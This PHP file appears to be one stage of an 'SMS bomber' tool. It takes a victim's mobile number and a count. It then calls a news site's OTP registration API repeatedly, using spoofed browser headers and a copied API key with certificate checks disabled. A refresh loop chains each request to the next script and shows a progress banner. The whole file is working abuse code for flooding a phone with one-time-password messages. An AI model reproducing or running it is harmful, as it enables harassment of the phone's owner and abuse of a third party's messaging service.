<?php 
$count=$_REQUEST['count'];
$sent=$_REQUEST['sent'];
$mobno=$_REQUEST['mobno'];
if($sent==$count){	
	header("location:index.php?msg=total ".$count." otp send successuffly");
}
else{ 
	
 $data="user_mobile=".$mobno."&action_type=register";
 $url="https://accounts.indianexpress.com/api/v2/sso/otp/";
         //header here
        $headers   = array();
        $headers[] = "Host:accounts.indianexpress.com";
        $headers[] = "content-length:43";
        $headers[] = "accept:application/json, text/javascript, */*; q=0.01";
        $headers[] = "x-requested-with:XMLHttpRequest";
        $headers[] = "user-agent:Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36";
        $headers[] = "x-api-key:ydDxstlJCp7a0CwCKqkwtpeptJidV6fkCnaxj51xYN7jAsgdoDtZgwVsML3Zfs9ktc9j7nlgfMEdyP3m3llagEsRAxF6rtTYeCSZ7jpg+x/gTX3htkBYttdr38Y5W2zdMN0eHyt+Qje4AWI6xog1gsJelA90VNtnm3XH3JN1LGbP3BbPUdSShWhoTYvKr9xiktc1s9r98LNI9CSBFtnA/lUZi1UzC3oQvPUmqwFzyvyb25tRKse6GVBZifWibZ1LBAgqDws9YJGG9gfAbsQKvdGeI3Fw7FJAlYkaFknq5Lmgyi9ej05/X8nMzS+L3mf1OTPuMXNOmab2W+umCrJDZg==";
        $headers[] = "content-type:application/x-www-form-urlencoded; charset=UTF-8";
        $headers[] = "origin:https://accounts.indianexpress.com";
        
        $headers[] = "Sec-Fetch-Site:same-site";
        $headers[] = "Sec-Fetch-Mode:cors";
        $headers[] = "Sec-Fetch-Dest:empty";
        $headers[] = "referer:https://accounts.indianexpress.com/email_register?stype=mobile%3Fclient_id%3Dindianexpress-03&response_type=code&redirect_uri=https%3A%2F%2Findianexpress.com%2Faccountredirects%2F&request_uri=https%3A%2F%2Findianexpress.com%2F&state=Zuv3vE";
        $headers[] = "Accept-Encoding:gzip, deflate, br";
        $headers[] = "Accept-Language:en-US,en;q=0.9";

        //end headers and function start
         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        curl_close($ch);
    



	$sentinc=$sent+1;
   $rl="24.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno;
   ?><center><div style="height: 50px;width: 40rem;border-radius:20px;background:#00F306;color: black;font-size: 32px;border:2px dotted red;padding-top: 8px;font-family: Yu Gothic;"> <?php echo $sent; ?> OTP SEND AND CONTINUE....</div></center><?php
	echo '<META HTTP-EQUIV=REFRESH CONTENT="2; '.$rl.'">';
	//header("location:2.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno);
}
?>
